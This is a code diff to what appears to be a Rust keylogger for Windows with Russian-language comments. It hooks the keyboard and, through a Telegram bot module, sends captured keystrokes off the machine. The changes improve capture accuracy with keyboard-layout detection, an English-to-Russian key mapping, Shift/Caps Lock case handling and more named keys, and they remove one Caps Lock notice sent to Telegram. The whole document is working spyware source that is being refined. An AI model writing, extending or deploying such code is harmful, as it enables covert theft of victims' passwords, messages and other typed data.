@@ -8,6 +8,7 @@ use winapi::um::libloaderapi::GetModuleHandleA;
 use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
 use winapi::shared::windef::HHOOK;
 use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};
+use winapi::um::winuser::{GetKeyboardLayout, GetWindowThreadProcessId, GetForegroundWindow};
 
 // для telegram
 use tokio;
@@ -23,6 +24,7 @@ use winreg::RegKey;
 use winapi::um::processthreadsapi::{GetCurrentProcess, SetPriorityClass};
 use winapi::um::winbase::BELOW_NORMAL_PRIORITY_CLASS;
 
+// модули
 mod config;
 mod tg;
 mod sites;
@@ -37,14 +39,10 @@ unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param:
         let is_caps_lock = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
         let is_shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;
 
-        // определение caps_lock
-        if is_caps_lock {
-            tokio::spawn(tg::bot_sender(String::from("(Caps Lock) ")));
-        }
-
         let message: String = match keyboard.vkCode {
             9 => "Key pressed: Tab".to_string(),
             20 => "Key pressed: Caps Lock".to_string(),
+            144 => "Key pressed: Num Lock".to_string(),
             160 => "Key pressed: Shift".to_string(),
             162 => "Key pressed: Ctrl".to_string(),
             164 => "Key pressed: Alt".to_string(),
@@ -52,15 +50,38 @@ unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param:
             27 => "Key pressed: Esc".to_string(),
             8 => "Key pressed: Backspace".to_string(),
             13 => "Key pressed: Enter".to_string(),
+            91 => "Key pressed: Win".to_string(),
+            46 => "Key pressed: Delete".to_string(),
+            37 => "Key pressed: Left Arrow".to_string(),
+            38 => "Key pressed: Up Arrow".to_string(),
+            39 => "Key pressed: Right Arrow".to_string(),
+            40 => "Key pressed: Down Arrow".to_string(),
+            115 => "Key pressed: F4".to_string(),
             _ => {
-                if is_shift_pressed && is_any_key_pressed() {
-                    if keyboard.vkCode == 164 {
-                        "(Shift) Key pressed: Alt".to_string()
-                    } else {
-                        format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char)  // Skip character keys when shift is pressed with other keys
+
+                if get_current_keyboard_layout() == 1033 {
+                    if is_shift_pressed ^ is_caps_lock {
+                        format!("{}", (keyboard.vkCode as u8 as char).to_ascii_uppercase())
                     }
-                } else {
-                    format!("Key pressed: {}", keyboard.vkCode as u8 as char).to_string() // Skip unhandled keys
+                    else {
+                        format!("{}", (keyboard.vkCode as u8 as char).to_ascii_lowercase())
+                    }
+                }
+                else {
+                    if is_shift_pressed ^ is_caps_lock {
+                        if let Some(ru_char) = en_to_ru_keyboard(keyboard.vkCode as u8 as char) {
+                            format!("{}", ru_char.to_uppercase())
+                        } else {
+                            "Неизвестный символ".to_string()
+                        }
+                    }
+                    else {
+                        if let Some(ru_char) = en_to_ru_keyboard(keyboard.vkCode as u8 as char) {
+                            format!("{}", ru_char)
+                        } else {
+                            "Неизвестный символ".to_string()
+                        }
+                    }
                 }
             }
         };
@@ -70,16 +91,55 @@ unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param:
     CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
 
-// Какая нибудь клавиша кроме Shift нажата?
-fn is_any_key_pressed() -> bool {
-    for i in 0..256 {
-        unsafe {
-            if (GetAsyncKeyState(i) & 0x8000u16 as i16) != 0 && i != winapi::um::winuser::VK_SHIFT {
-                return true;
-            }
-        }
+// из английской раскладки в русскую
+fn en_to_ru_keyboard(c: char) -> Option<char> {
+    match c.to_ascii_lowercase() {
+        'q' => Some('й'),
+        'w' => Some('ц'),
+        'e' => Some('у'),
+        'r' => Some('к'),
+        't' => Some('е'),
+        'y' => Some('н'),
+        'u' => Some('г'),
+        'i' => Some('ш'),
+        'o' => Some('щ'),
+        'p' => Some('з'),
+        '[' => Some('х'),
+        ']' => Some('ъ'),
+        'a' => Some('ф'),
+        's' => Some('ы'),
+        'd' => Some('в'),
+        'f' => Some('а'),
+        'g' => Some('п'),
+        'h' => Some('р'),
+        'j' => Some('о'),
+        'k' => Some('л'),
+        'l' => Some('д'),
+        ';' => Some('ж'),
+        '\'' => Some('э'),
+        'z' => Some('я'),
+        'x' => Some('ч'),
+        'c' => Some('с'),
+        'v' => Some('м'),
+        'b' => Some('и'),
+        'n' => Some('т'),
+        'm' => Some('ь'),
+        ',' => Some('б'),
+        '.' => Some('ю'),
+        '/' => Some('.'),
+        _ => None,
     }
-    false
+}
+
+
+// раскладка клавиатуры
+fn get_current_keyboard_layout() -> u32 {
+    unsafe {
+        let foreground_window = GetForegroundWindow();
+        let thread_id = GetWindowThreadProcessId(foreground_window, std::ptr::null_mut());
+        let layout = GetKeyboardLayout(thread_id);
+        (layout as u32) & 0xFFFF
+    }
 }
 
 // Закидываем удочку (начинаем записывать клавиши)
